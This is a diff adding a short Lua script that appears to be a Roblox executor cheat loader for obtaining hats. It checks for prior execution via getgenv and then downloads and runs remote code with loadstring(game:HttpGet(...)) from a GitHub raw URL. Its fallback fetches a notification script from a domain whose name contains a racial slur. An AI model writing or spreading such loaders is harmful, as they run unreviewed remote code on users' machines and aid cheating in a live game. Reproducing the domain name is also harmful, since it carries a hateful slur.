@@ -1,0 +1,20 @@
+repeat task.wait() until game:IsLoaded()
+_G.Prefix = ";" -- Customize your Prefix
+
+
+--------------------------------------------------------------------------------------
+
+
+if getgenv().executed then
+    return warn("Script is already executed!");
+else
+    getgenv().executed = true;
+end
+
+local success, err = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkDrake666/HatHub/main/GetHats.txt"))();
+end)
+
+if not success then
+    local Notify = loadstring(game:HttpGet("https://obama-is-a-nig.ga/scripts/Notification.txt"))();
+    Notify:Notification("Error", "An error occured while executing kkeyy's get hat script!", 5);
+end
